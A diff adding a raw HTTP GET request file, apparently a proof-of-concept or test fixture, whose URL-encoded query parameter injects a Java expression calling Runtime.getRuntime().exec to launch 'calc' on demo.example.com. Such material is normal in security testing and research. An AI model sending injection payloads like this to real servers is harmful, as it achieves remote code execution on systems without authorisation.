@@ -1,0 +1,4 @@
+GET /a?s=p%3Djava.lang.Runtime.getRuntime().exec(%26quot;calc%26quot;) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
